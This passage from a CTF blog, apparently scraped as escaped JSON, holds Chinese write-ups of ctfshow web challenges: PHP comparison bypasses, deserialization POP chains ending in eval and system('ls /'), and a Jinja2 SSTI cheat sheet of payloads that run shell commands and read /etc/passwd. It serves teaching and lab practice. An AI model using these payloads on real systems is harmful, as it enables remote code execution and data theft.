=requests.post(url,data={\u0026#39;data[]\u0026#39;:px}).text.replace(\u0026#39;\\\\n\u0026#39;,\u0026#39;\u0026lt;br\u0026gt;\u0026#39;)\\n\u0026#34;, \u0026#34;# print(txt)\\n\u0026#34;, \u0026#34;txt = re.findall(r\u0026#39;#6a91c6;\\\u0026#34;\u0026gt;(.*)\u0026lt;/blockquote\u0026gt;\u0026#39;,txt)[0].replace(\u0026#39;\u0026lt;br\u0026gt;\u0026#39;,\u0026#39;\\\\n\u0026#39;).replace(\u0026#39;\\\\n\\\\n\u0026#39;,\u0026#39;\\\\n\u0026#39;)\\n\u0026#34;, \u0026#34;print(txt)\u0026#34; ] } ], \u0026#34;metadata\u0026#34;: { \u0026#34;kernelspec\u0026#34;: { \u0026#34;display_name\u0026#34;: \u0026#34;Python 3.10.4 64-bit\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;python\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;python3\u0026#34; }, \u0026#34;language_info\u0026#34;: { \u0026#34;codemirror_mode\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;ipython\u0026#34;, \u0026#34;version\u0026#34;: 3 }, \u0026#34;file_extension\u0026#34;: \u0026#34;.py\u0026#34;, \u0026#34;mimetype\u0026#34;: \u0026#34;text/x-python\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;python\u0026#34;, \u0026#34;nbconvert_exporter\u0026#34;: \u0026#34;python\u0026#34;, \u0026#34;pygments_lexer\u0026#34;: \u0026#34;ipython3\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;3.10.7\u0026#34; }, \u0026#34;vscode\u0026#34;: { \u0026#34;interpreter\u0026#34;: { \u0026#34;hash\u0026#34;: \u0026#34;3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e\u0026#34; } } }, \u0026#34;nbformat\u0026#34;: 4, \u0026#34;nbformat_minor\u0026#34;: 0 } ","date":"2023-05-29T13:27:24+08:00","permalink":"https://relish1one.github.io/p/ctfshow-%E6%96%B0%E6%89%8B%E6%9D%AF-web/","title":"ctfshow-新手杯-web"},{"content":"ctfshow-年CTF-web 除夕 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Notice: Undefined index: year in /var/www/html/index.php on line 16 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2023-01-18 11:36:09 # @Last Modified by: h1xa # @Last Modified time: 2023-01-19 10:18:44 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ include \u0026#34;flag.php\u0026#34;; $year = $_GET[\u0026#39;year\u0026#39;]; if($year==2022 \u0026amp;\u0026amp; $year+1!==2023){ echo $flag; }else{ highlight_file(__FILE__); } 题目分析 1 $year==2022 \u0026amp;\u0026amp; $year+1!==2023 第一个弱比较，第二个强比较，\n尝试了2022a,第一个if可以，第二个if绕不过，因为会转换为整数2022\n尝试了2022.9，第一个if不可以，第二个if可以成功绕过，2022.9 是一个浮点数，而 2022 是一个整数。虽然它们的值看起来很接近，但由于浮点数的精度限制，它们可能不会被判断为相等。\n尝试了2022e2，由于浮点数 2022e2 表示的数值为 202200，与整数 2022 不相等。\n知识点 在 PHP 中，科学计数法表示的数字会被解释为浮点数类型。 payload（浮点数类型绕过） 1 2 3 4 ?year=2022.0 当比较 $year == 2022 时，由于进行了类型转换，字符串 \u0026#34;2022.0\u0026#34; 会被转换为整数 2022。因此，条件 $year == 2022 返回 true。 另外，$year + 1 !== 2023 的比较中使用了不等于（!==）操作符，该操作符会同时比较值和类型。由于 $year + 1 的结果是浮点数 2023.0，而不是整数 2023，因此条件 $year + 1 !== 2023 返回 true。 1 2 ?year=202.2e1 $year 被赋值为科学计数法表示的浮点数 \u0026#34;202.2e1\u0026#34;。202.2e1 表示 202.2 乘以 10 的 1 次方，即 2022.0。 1 2 3 4 ?year=2022.a 在这种情况下，字符串 \u0026#34;2022.a\u0026#34; 中的开头部分 \u0026#34;2022\u0026#34; 是一个有效的数字，因此 PHP 将其转换为数字类型。由于存在小数点之后的字符 \u0026#34;a\u0026#34;，PHP 将其忽略并将字符串转换为浮点数类型。 因此，\u0026#34;2022.a\u0026#34; 被转换为浮点数 2022.0，而不是整数类型。 初三 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2023-01-19 10:31:36 # @Last Modified by: h1xa # @Last Modified time: 2023-01-19 13:11:08 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); extract($_GET); include \u0026#34;flag.php\u0026#34;; highlight_file(__FILE__); $_=function($__,$___){ return $__==$___?$___:$__; }; $$__($_($_GET{ $___ }[$____]{ $_____ }(),$flag)); 题目分析 1 2 3 4 5 6 # 代码看着太不美观了，先自己美化一下 $_=function($__,$___) { return $__==$___?$___:$__; }; $$__($_($_GET{$___}[$____]{$_____}(),$flag)); 1 2 3 4 5 6 7 整个思路就是定义一个函数，接收两个参数，利用三目运算符比较传入的两个参数，如果弱相等，返回第二个参数，即flag，否则返回第一个参数。 下面的语句$_($_GET{$___}[$____]{$_____}(),$flag)是对定义的函数进行了调用传递了两个参数， 第一个参数：$_GET{$___}[$____]{$_____}() $_GET{$___}[$____]{$_____}，中括号花括号一样的用法，简化下$_GET[$___][$____][$_____]，是个三维数组 第二个参数：$flag 但是如果只是调用，是只有返回值，没有回显的，$$__()的作用就体现出来啦，必须是一个打印函数 print_r()或者var_dump等等都可以。 1 由于自定义函数是弱类型比较，只需要返回一个数字0，就可以和$flag弱类型相等成立，json_last_error函数符合要求，phpinfo()也可以。 知识点 phpinfo()==\u0026lsquo;任意字符串\u0026rsquo; 0也弱等于字符串， 0 == ‘字符串’ json_last_error() 函数是 int(0) php中，中括号和花括号可等同 1 2 $_GET{$___}[$____]{$_____}等价于$_GET[$___][$____][$_____]， 是个三维数组 payload 1 2 3 4 5 ?__=x\u0026amp;x=var_dump\u0026amp;___=a\u0026amp;____=b\u0026amp;_____=c\u0026amp;a[b][c]=json_last_error ?__=a\u0026amp;a=print_r\u0026amp;___=x\u0026amp;____=b\u0026amp;_____=c\u0026amp;x[b][c]=phpinfo 不能直接让__=var_dump，等等，因为所有的_都是变量名，$_是变量，需要给变量再赋值。 初六 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 include \u0026#34;flag.php\u0026#34;; class happy2year{ private $secret; private $key; function __wakeup(){ $this-\u0026gt;secret=\u0026#34;\u0026#34;; } function __call($method,$argv){ return call_user_func($this-\u0026gt;key, array($method,$argv)); } function getSecret($key){ $key=$key?$key:$this-\u0026gt;key; return $this-\u0026gt;createSecret($key); } function createSecret($key){ return base64_encode($this-\u0026gt;key.$this-\u0026gt;secret); } function __get($arg){ global $flag; $arg=\u0026#34;get\u0026#34;.$arg; $this-\u0026gt;$arg = $flag; return $this-\u0026gt;secret; } function __set($arg,$argv){ $this-\u0026gt;secret=base64_encode($arg.$argv); } function __invoke(){ return $this-\u0026gt;$secret; } function __toString(){ return base64_encode($this-\u0026gt;secret().$this-\u0026gt;secret); } function __destruct(){ $this-\u0026gt;secret = \u0026#34;\u0026#34;; } } highlight_file(__FILE__); error_reporting(0); $data=$_POST[\u0026#39;data\u0026#39;]; $key = $_POST[\u0026#39;key\u0026#39;]; $obj = unserialize($data); if($obj){ $secret = $obj-\u0026gt;getSecret($key); print(\u0026#34;你提交的key是\u0026#34;.$key.\u0026#34;\\n生成的secret是\u0026#34;.$secret); } 题目分析 1 2 3 4 5 6 function __get($arg){ global $flag; $arg=\u0026#34;get\u0026#34;.$arg; $this-\u0026gt;$arg = $flag; return $this-\u0026gt;secret; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 关键函数__get，先根据这个函数往回倒推回去 根据$this-\u0026gt;$arg = $flag;可知，触发了set函数 __set()，用于将数据写入不可访问的属性 set函数的$this-\u0026gt;secret=base64_encode($arg.$argv);，得出$arg=\u0026#34;get\u0026#34;,$argv=$flag，将secret的值和flag联系起来，$this-\u0026gt;secret=base64_encode(\u0026#34;get\u0026#34;.$flag)。 然后倒推怎么触发__get函数？ __get()，用于从不可访问的属性读取数据或者不存在这个键都会调用此方法。 简单来说，要么是调用不存在的属性，要么调用私有变量。 这里想到了一开始的私有变量secret，要想调用secert，就需要触发invoke函数，return $this-\u0026gt;$secret; __invoke()，尝试将对象调用为函数时触发 为了触发invoke函数，观察到了call函数的return call_user_func($this-\u0026gt;key, array($method,$argv)); call_user_func()函数把key作为了函数名来使用，这里提供了思路，可以将key赋值为当前对象 __call()，在对象上下文中调用不可访问的方法时触发 为了触发call函数，需要调用未定义的函数，即不存在的函数，发现了toString函数的return base64_encode($this-\u0026gt;secret().$this-\u0026gt;secret);，secret()就是未定义的函数 __toString()，把类、对象当作字符串使用时触发 为了触发toString函数，就要把对象当作字符串处理，观察到createSecret函数的return base64_encode($this-\u0026gt;key.$this-\u0026gt;secret);，将我们key对象当作了字符串进行拼接。 观察createSecret函数，发现getSecret函数调用了此函数。 由此整条反序列化链构造完成。 知识点 魔术方法 1 2 3 4 5 6 7 8 9 10 11 __wakeup() //执行unserialize()，会先调用这个函数 __sleep() //执行serialize()，会先调用这个函数 __destruct() //对象被销毁时触发 __call() //在对象上下文中调用不可访问的方法时触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()触发 __toString() //把类当作字符串使用时触发 __invoke() //当尝试将对象调用为函数时触发 php构造方法__construct() 1、构造方法__construct()是一种结构特有的特殊方法。\n2、该方法由系统规定，开发人员在定义时只需写一次，有构造方法的类在实例化对象后，对象自动调用。\nphp魔术方法__invoke() 1、直接调用对象名当方法使用时，就调用的是__invoke()方法。\n2、对象本身不能直接当函数用。如果去掉__invoke()方法，还是将对象当做方法来使用时，就会报错。\nphp函数call_user_func 1 call_user_func()是PHP中的内置函数，用于调用第一个参数给定的回调并将其余参数作为参数传递。它用于调用用户定义的函数。 函数作用：该函数主要用于通过函数名去调用该函数，除了调用函数，还可以调用对象的方法\n1 mixed call_user_func ( $function_name[, mixed $value1[, mixed $... ]]) $function_name：已定义函数列表中函数调用的名称。它是一个字符串类型参数。 $value：混合值。一个或多个要传递给函数的参数。\nPHP call_user_func()实例讲解\npayload 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class happy2year{ private $secret; private $key; function __construct() { $this-\u0026gt;key = $this; } } echo urlencode(serialize(new happy2year())); POST:data=O%3A10%3A%22happy2year%22%3A2%3A%7Bs%3A18%3A%22%00happy2year%00secret%22%3BN%3Bs%3A15%3A%22%00happy2year%00key%22%3Br%3A1%3B%7D 提交之后，页面回显： 你提交的key是 生成的secret是V2pKV01Ga3pVbTFqTW1oMlpETjBiVTlVV21sT1JGVjVUV2t3TVU5WFJtbE1WRkY1VGxSSmRGbHRUbTFaYVRGc1drUlJlVTFVUlRWUFYwVTBUMFJrT1ZveVZqQlpNMUp0WXpKb2RtUXpkRzFQVkZwcFRrUlZlVTFwTURGUFYwWnBURlJSZVU1VVNYUlpiVTV0V1dreGJGcEVVWGxOVkVVMVQxZEZORTlFWkRrPQ== 将内容进行三次base64解码，因为在类happy2year()中，一共被编码了三次。 1 2 3 4 5 6 7 8 $key = new happy2year(); 在给 $key 变量赋值时，会创建一个新的 happy2year 对象，并将其分配给 $key。 然而，在构造函数 __construct() 中，又试图创建一个新的 happy2year 对象并将其分配给局部变量 $key。 这会导致递归的无限循环，因为每次创建新的 happy2year 对象时，都会再次调用构造函数，又创建一个新的 happy2year 对象，以此类推，形成无限递归。 $this-\u0026gt;key = $this; 这将类的当前实例赋值给 $key 属性，而不是创建一个新的 happy2year 对象。 $this-\u0026gt;key 是将当前对象的引用分配给 $key 属性的一种方式。使用 $this 引用表示当前类的实例，因此 $this-\u0026gt;key 表示在当前对象中创建一个属性 $key 并将其赋值为当前对象本身。 ","date":"2023-05-29T13:22:26+08:00","permalink":"https://relish1one.github.io/p/ctfshow-%E5%B9%B4ctf-web/","title":"ctfshow-年CTF-web"},{"content":"ctfshow-愚人杯-web easy_signin 1.做题思路 观察URL，发现有GET传参img，传参内容是base64\n?img=ZmFjZS5wbmc= base64解码后发现传参内容是face.png\n传参system(\u0026ldquo;ls\u0026rdquo;)；经过编码后的base64，发现返回 Warning: file_get_contents(system(\u0026ldquo;ls\u0026rdquo;);): failed to open stream: No such file or directory in /var/www/html/index.php on line 18 看到了文件读取函数，而且看到路径有个index.php，试着读取一下看看 传参后，查看源代码，将其base64复制，然后解码，拿到flag\n2.知识点 Data URI scheme 1 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJAQMAAADaX5RTAAAAA3NCSVQICA Data URI scheme是在RFC2397中定义的，目的是将一些小的数据，直接嵌入到网页中，从而不用再从外部文件载入。比如上面那串字符，其实是一张小图片，data表示取得数据的协定名称，image/png 是数据类型名称，base64 是数据的编码方法，逗号后面就是这个image/png文件base64编码后的数据。\nData URI scheme支持的类型有：\ndata:,文本数据 data:text/plain,文本数据 data:text/html,HTML代码 data:text/html;base64,base64编码的HTML代码 data:text/css,CSS代码 data:text/css;base64,base64编码的CSS代码 data:text/javascript,Javascript代码 data:text/javascript;base64,base64编码的Javascript代码 data:image/gif;base64,base64编码的gif图片数据 data:image/png;base64,base64编码的png图片数据 data:image/jpeg;base64,base64编码的jpeg图片数据 data:image/x-icon;base64,base64编码的icon图片数据 3.payload 1 2 ?img=aW5kZXgucGhw // index.php，base64编码：aW5kZXgucGhw 被遗忘的反序列化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 \u0026lt;?php # 当前目录中有一个txt文件哦 error_reporting(0); show_source(__FILE__); include(\u0026#34;check.php\u0026#34;); class EeE{ public $text; public $eeee; public function __wakeup(){ if ($this-\u0026gt;text == \u0026#34;aaaa\u0026#34;){ echo lcfirst($this-\u0026gt;text); } } public function __get($kk){ echo \u0026#34;$kk,eeeeeeeeeeeee\u0026#34;; } public function __clone(){ $a = new cycycycy; $a -\u0026gt; aaa(); } } class cycycycy{ public $a; private $b; public function aaa(){ $get = $_GET[\u0026#39;get\u0026#39;]; $get = cipher($get); if($get === \u0026#34;p8vfuv8g8v8py\u0026#34;){ eval($_POST[\u0026#34;eval\u0026#34;]); } } public function __invoke(){ $a_a = $this -\u0026gt; a; echo \u0026#34;\\$a_a\\$\u0026#34;; } } class gBoBg{ public $name; public $file; public $coos; private $eeee=\u0026#34;-_-\u0026#34;; public function __toString(){ if(isset($this-\u0026gt;name)){ $a = new $this-\u0026gt;coos($this-\u0026gt;file); echo $a; }else if(!isset($this -\u0026gt; file)){ return $this-\u0026gt;coos-\u0026gt;name; }else{ $aa = $this-\u0026gt;coos; $bb = $this-\u0026gt;file; return $aa(); } } } class w_wuw_w{ public $aaa; public $key; public $file; public function __wakeup(){ if(!preg_match(\u0026#34;/php|63|\\*|\\?/i\u0026#34;,$this -\u0026gt; key)){ $this-\u0026gt;key = file_get_contents($this -\u0026gt; file); }else{ echo \u0026#34;不行哦\u0026#34;; } } public function __destruct(){ echo $this-\u0026gt;aaa; } public function __invoke(){ $this -\u0026gt; aaa = clone new EeE; } } $_ip = $_SERVER[\u0026#34;HTTP_AAAAAA\u0026#34;]; unserialize($_ip); // clone关键字:用于克隆一个完全一样的对象，克隆之后两个对象互不干扰。 // __clone() 方法只会在对象被克隆的时候自动调用。 1.做题思路 先看代码，前面是各种类，最下面有句反序列化代码\n1 $_ip = $_SERVER[\u0026#34;HTTP_AAAAAA\u0026#34;]; $ip = $SERVER[\u0026ldquo;HTTP_AAAAAA\u0026rdquo;]; ：接收header头中 aaaaaa参数的值，然后将其反序列化。\n发现题目包含了check.php，尝试读取，利用w_wuw_w类\n此类反序列化之前先触发wakeup这个方法，检测key中是否有关键字\n把读取file的内容给key，结束时显示aaa，可以用引用把aaa变量和key变量绑定，让aaa和key的内容相同，从而看到文件内容。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php class w_wuw_w{ public $aaa; public $key; public $file; } $a=new w_wuw_w(); $a-\u0026gt;aaa=\u0026amp;$a-\u0026gt;key; $a-\u0026gt;file=\u0026#34;check.php\u0026#34;; echo serialize($a); ?\u0026gt; # 标准输出：O:7:\u0026#34;w_wuw_w\u0026#34;:3:{s:3:\u0026#34;aaa\u0026#34;;N;s:3:\u0026#34;key\u0026#34;;R:2;s:4:\u0026#34;file\u0026#34;;s:9:\u0026#34;check.php\u0026#34;;} check.php的源码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function cipher($str) { if(strlen($str)\u0026gt;10000){ exit(-1); } $charset = \u0026#34;qwertyuiopasdfghjklzxcvbnm123456789\u0026#34;; $shift = 4; $shifted = \u0026#34;\u0026#34;; for ($i = 0; $i \u0026lt; strlen($str); $i++) { $char = $str[$i]; $pos = strpos($charset, $char); if ($pos !== false) { $new_pos = ($pos - $shift + strlen($charset)) % strlen($charset); $shifted .= $charset[$new_pos]; } else { $shifted .= $char; } } return $shifted; } 发现函数cipher在类cycycycy中被调用，猜测是check.php是个加密脚本。\n1 2 3 4 if($get === \u0026#34;p8vfuv8g8v8py\u0026#34;) { eval($_POST[\u0026#34;eval\u0026#34;]); } 可以在类cycycycy得知，密文为p8vfuv8g8v8py\n观察发现是简单的凯撒移位密码，可以利用在线工具或者脚本解密一下。\nphp解密脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function decipher($str) { if(strlen($str)\u0026gt;10000){ exit(-1); } $charset = \u0026#34;qwertyuiopasdfghjklzxcvbnm123456789\u0026#34;; $shift = 4; $deciphered = \u0026#34;\u0026#34;; for ($i = 0; $i \u0026lt; strlen($str); $i++) { $char = $str[$i]; $pos = strpos($charset, $char); if ($pos !== false) { $new_pos = ($pos + $shift) % strlen($charset); $deciphered .= $charset[$new_pos]; } else { $deciphered .= $char; } } return $deciphered; } python解密脚本\n1 2 3 4 5 6 charset = \u0026#39;qwertyuiopasdfghjklzxcvbnm123456789\u0026#39; key = \u0026#39;p8vfuv8g8v8py\u0026#39; result = \u0026#39;\u0026#39; for k in key: result += charset[(charset.index(k) + 4) % len(charset)] print(result) 解密后明文:fe1ka1ele1efp\n为了利用post传参，需要触发aaa()方法，从谁触发了aaa()方法来推导，倒着推\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 EeE的_clone方法触发cycycy的aaa, w_wuw_w的__invoke方法触发EeE的__clone 如何调用__invoke方法？ __invoke() //当尝试将对象调用为函数时触发 __toString() //把类当作字符串使用时触发 __wakeup() //执行unserialize()，会先调用这个函数 gBoBg的_toString方法如果让aa为w_wuw_w类，则能触发wuw的_invoke， 如何触发gBoBg的_toString方法？ EeE的_wakeup方法能触发gBoBg的toString EeE的text赋值为gBoBg $a = new EeE(); $a -\u0026gt;text = new gBoBg(); // 触发了gBoBg的_toString方法 $a -\u0026gt;text -\u0026gt;coos = new w_wuw_w(); // 触发了w_wuw_w的__invoke方法 $a -\u0026gt;text -\u0026gt;file = \u0026#34;any\u0026#34;; echo serialize($a); 完整的php反序列化构造\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php class EeE{ public $text; public $eeee; } class gBoBg{ public $name; public $file; public $coos; } class w_wuw_w{ public $aaa; public $key; public $file; } class cycycycy{ } $a = new EeE(); $a -\u0026gt;text = new gBoBg(); $a -\u0026gt;text -\u0026gt;file = \u0026#34;any\u0026#34;; $a -\u0026gt;text -\u0026gt;coos = new w_wuw_w(); echo serialize($a); # 标准输出：O:3:\u0026#34;EeE\u0026#34;:2:{s:4:\u0026#34;text\u0026#34;;O:5:\u0026#34;gBoBg\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;N;s:4:\u0026#34;file\u0026#34;;s:3:\u0026#34;any\u0026#34;;s:4:\u0026#34;coos\u0026#34;;O:7:\u0026#34;w_wuw_w\u0026#34;:3:{s:3:\u0026#34;aaa\u0026#34;;N;s:3:\u0026#34;key\u0026#34;;N;s:4:\u0026#34;file\u0026#34;;N;}}s:4:\u0026#34;eeee\u0026#34;;N;} 2.知识点 反序列化漏洞 反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，利用对对象属性的篡改实现最终的攻击。\n利用手法 对象的序列化和反序列化只能是其他类的属性，篡改反序列化的字符串只能控制预先设置好的属性，如果想利用类里面的方法，需要利用魔术方法，魔术方法的调用是在该类的序列化或者反序列化的同时自动完成，不需要人工干预。因此只要类中出现了能利用的魔术方法，就能通过反序列化，控制其对象属性，从而实现对这些函数（方法）的操控。\n常见魔术方法 1 2 3 4 5 6 7 8 9 10 11 __wakeup() //执行unserialize()，会先调用这个函数 __sleep() //执行serialize()，会先调用这个函数 __destruct() //对象被销毁时触发 __call() //在对象上下文中调用不可访问的方法时触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()触发 __toString() //把类当作字符串使用时触发 __invoke() //当尝试将对象调用为函数时触发 利用过程 1.寻找unserialize()函数的参数是否有可利用点； 2.寻找反序列化的目标，重点寻找存在 wakeup() 或 destruct() 魔术方法的类； 3.逐层查看该类在魔术方法中使用的属性和属性调用的方法，观察是否有可控的属性，可以实现在当前调用过程中触发； 4.找到要控制的属性之后，将要用到的代码部分复制下来，构造序列化。\nPHP反序列化POP链 POP 面向属性编程(Property-Oriented Programing) ：从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击目的。\n反序列化POP链是通过控制对象的属性来实现控制程序的执行流程，进而实现利用本身代码达到攻击目的。\n3.payload 1 2 3 4 5 6 7 8 9 10 11 12 13 14 bp抓包： 在header部分添加 AAAAAA: O:7:\u0026#34;w_wuw_w\u0026#34;:3:{s:3:\u0026#34;aaa\u0026#34;;N;s:3:\u0026#34;key\u0026#34;;R:2;s:4:\u0026#34;file\u0026#34;;s:9:\u0026#34;check.php\u0026#34;;} 得到check.php源码，其为加密脚本，利用已知密文，进行解密，得到fe1ka1ele1efp 最终构造payload： GET: ?get=fe1ka1ele1efp POST: system(\u0026#34;ls /\u0026#34;); system(\u0026#34;tac /f1agaaa\u0026#34;); Header: AAAAAA: O:3:\u0026#34;EeE\u0026#34;:2:{s:4:\u0026#34;text\u0026#34;;O:5:\u0026#34;gBoBg\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;N;s:4:\u0026#34;file\u0026#34;;s:3:\u0026#34;any\u0026#34;;s:4:\u0026#34;coos\u0026#34;;O:7:\u0026#34;w_wuw_w\u0026#34;:3:{s:3:\u0026#34;aaa\u0026#34;;N;s:3:\u0026#34;key\u0026#34;;N;s:4:\u0026#34;file\u0026#34;;N;}}s:4:\u0026#34;eeee\u0026#34;;N;} easy_ssti 1.做题思路 查看题目源码，下载压缩包app.zip，解压得到app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from flask import Flask from flask import render_template_string,render_template app = Flask(__name__) @app.route(\u0026#39;/hello/\u0026#39;) def hello(name=None): return render_template(\u0026#39;hello.html\u0026#39;,name=name) @app.route(\u0026#39;/hello/\u0026lt;name\u0026gt;\u0026#39;) def hellodear(name): if \u0026#34;ge\u0026#34; in name: return render_template_string(\u0026#39;hello %s\u0026#39; % name) elif \u0026#34;f\u0026#34; not in name: return render_template_string(\u0026#39;hello %s\u0026#39; % name) else: return \u0026#39;Nonononon\u0026#39; 发现了python的flask框架，需要访问/hello.html，拼接：/hello/{{payload}}进行注入\n试一下{{1+1}}，页面返回2，证明代码执行成功，存在SSTI注入。\n2.SSTI注入 ssti漏洞原理 SSTI（server-side template injection)为服务端模板注入攻击，它主要是由于框架的不规范使用而导致的。\n主要为python的一些框架，如 jinja2 mako tornado django flask、PHP框架smarty twig thinkphp、java框架jade velocity spring等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。\n当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑。\nflask的jinja2引擎利用手法 {{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容当做变量解析替换。比如{{1+1}}会被解析成2。如此一来就可以实现如同sql注入一样的注入漏洞。\n常用的构造语句 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 无过滤 # 读文件 #读取文件类，\u0026lt;type ‘file’\u0026gt; file位置一般为40，直接调用 {{[].__class__.__base__.__subclasses__()[40](\u0026#39;flag\u0026#39;).read()}} {{[].__class__.__bases__[0].__subclasses__()[40](\u0026#39;etc/passwd\u0026#39;).read()}} {{[].__class__.__bases__[0].__subclasses__()[40](\u0026#39;etc/passwd\u0026#39;).readlines()}} {{[].__class__.__base__.__subclasses__()[257](\u0026#39;flag\u0026#39;).read()}} (python3) #直接使用popen命令，python2是非法的，只限于python3 os._wrap_close 类里有popen {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;whoami\u0026#39;).read()}} {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen(\u0026#39;whoami\u0026#39;).read()}} #调用os的popen执行命令 #python2、python3通用 {{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls\u0026#39;).read()}} {{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls /flag\u0026#39;).read()}} {{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}} {{\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[185].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flag\u0026#39;).read()}} {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()}} {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()}} {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;whoami\u0026#39;).read()}} #python3专属 {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()}} {{\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls /\u0026#39;).read()}} #调用eval函数读取 #python2 {{[].__class__.__base__.__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()\u0026#34;)}} {{\u0026#34;\u0026#34;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;)\u0026#39;)}} {{\u0026#34;\u0026#34;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;)\u0026#39;)}} {{\u0026#34;\u0026#34;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,\u0026#39;os.system(\u0026#34;ls\u0026#34;)\u0026#39;)}} #python3 {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()\u0026#34;)}} {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][\u0026#39;eval\u0026#39;]}} 